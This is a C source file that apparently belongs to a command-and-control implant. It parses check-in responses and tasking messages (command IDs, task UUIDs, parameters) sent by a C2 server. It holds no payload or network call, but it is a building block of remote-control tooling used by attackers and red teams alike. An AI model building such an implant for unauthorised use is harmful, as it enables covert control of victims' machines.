#include <stdint.h>
#include <string.h>
#include "parser.h"
#include "utils.h"

// Read 1 byte. Advances *offset by 1.
uint8_t read_byte(const uint8_t* buf, size_t* offset) {
 return buf[(*offset)++];
}

// Copy size bytes from buf[*offset] into data. Advances *offset by size.
void read_bytes(const uint8_t* buf, size_t* offset, uint8_t* data, size_t size) {
 memcpy(data, buf + *offset, size);
 *offset += size;
}

// Like read_bytes but appends a null terminator to produce a C string.
void read_string(const uint8_t* buf, size_t* offset, char* data, size_t size) {
 memcpy(data, buf + *offset, size);
 data[size] = '\0';
 *offset += size;
}

int parse_checkin_response(const uint8_t* buf, const size_t len, char* uuid_out) {
 if (len < 38) return -1;     // incomplete buffer
    if (buf[0] != MSG_CHECKIN) return -1;  // wrong message type
 memcpy(uuid_out, buf + 1, 36);
 uuid_out[36] = '\0';
 return (buf[37] == 0x01) ? 0 : -1;
}

int parse_tasks(const uint8_t* buf, size_t len, Task* tasks, uint32_t* task_count) {
    if (!buf || !tasks || !task_count) return -1;

    /* 1. Validate */
    if (len < 5 || buf[0] != MSG_GET_TASKING) return -1;

    // Skip the MSG_GET_TASKING type byte
    size_t offset = 1;

    *task_count = read_u32(buf, &offset);

    /* Anti-exploit: tasks[] has MAX_TASKS slots; clamp to avoid stack overflow
       if the C2 sends a maliciously large count. */
    if (*task_count > MAX_TASKS) {
        *task_count = MAX_TASKS;
    }

    for (uint32_t i = 0; i < *task_count; i++) {

        if (offset + 4 > len) return -1;
        uint32_t task_size = read_u32(buf, &offset);

        if (offset + 1 > len) return -1;
        tasks[i].command_id = read_byte(buf, &offset);

        // uuid: 36 bytes + null terminator
        if (offset + 36 > len) return -1;
        read_string(buf, &offset, tasks[i].task_uuid, 36);

        if (offset + 4 > len) return -1;
        tasks[i].param_count = read_u32(buf, &offset);

        uint32_t params = tasks[i].param_count;
        if (params > MAX_PARAMS) {
            params = MAX_PARAMS;
        }

        for (uint32_t j = 0; j < params; j++) {
            if (offset + 4 > len) return -1;
            tasks[i].params[j].size = read_u32(buf, &offset);

            if (offset + tasks[i].params[j].size > len) return -1;

            tasks[i].params[j].data = (uint8_t*)(buf + offset);
            offset += tasks[i].params[j].size;
        }
    }
    return 1;
}
